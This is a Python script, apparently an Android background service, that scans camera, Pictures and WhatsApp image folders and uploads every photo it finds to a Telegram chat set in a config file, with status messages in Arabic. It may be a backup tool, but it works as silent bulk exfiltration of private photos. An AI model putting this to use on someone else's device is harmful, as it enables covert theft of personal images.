import os
import asyncio
import json
import time
from telegram import Bot
from telegram.request import HTTPXRequest

# Path to config and status (from service arguments)
arg = os.environ.get('PYTHON_SERVICE_ARGUMENT', '')
config_file = os.path.join(arg, 'config.json')
status_file = os.path.join(arg, 'status.json')

def update_status(status, progress):
    try:
        with open(status_file, 'w') as f:
            json.dump({'status': status, 'progress': progress}, f)
    except:
        pass

async def scan_and_send():
    if not os.path.exists(config_file):
        update_status("خطأ: الإعدادات مفقودة", 0)
        return

    with open(config_file, 'r') as f:
        config = json.load(f)
    
    token = config.get('token')
    chat_id = config.get('chat_id')

    if not token or not chat_id:
        update_status("خطأ: التوكن أو القناة مفقودة", 0)
        return

    try:
        bot = Bot(token=token, request=HTTPXRequest(connection_pool_size=10))
        update_status("جاري فحص الصور...", 10)
    except Exception as e:
        update_status(f"فشل الاتصال: {str(e)}", 0)
        return

    # Scan paths
    paths_to_scan = [
        "/sdcard/DCIM/Camera",
        "/sdcard/Pictures",
        "/sdcard/WhatsApp/Media/WhatsApp Images",
        "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images",
        "/storage/emulated/0/DCIM/Camera",
        "/storage/emulated/0/Pictures"
    ]

    files_to_send = []
    for p in paths_to_scan:
        if os.path.exists(p):
            for root, _, files in os.walk(p):
                for file in files:
                    if file.lower().endswith(('.jpg', '.jpeg', '.png')):
                        files_to_send.append(os.path.join(root, file))

    total = len(files_to_send)
    if total == 0:
        update_status("لم يتم العثور على صور", 100)
        return

    sent = 0
    for i, file_path in enumerate(files_to_send):
        try:
            with open(file_path, 'rb') as img:
                await bot.send_photo(chat_id=chat_id, photo=img)
            sent += 1
            progress = int((i + 1) / total * 100)
            update_status(f"تم إرسال {sent}/{total}", progress)
            await asyncio.sleep(1) # Flood prevention
        except Exception:
            continue

    update_status(f"اكتمل الإرسال: {sent} صورة", 100)

if __name__ == "__main__":
    asyncio.run(scan_and_send())
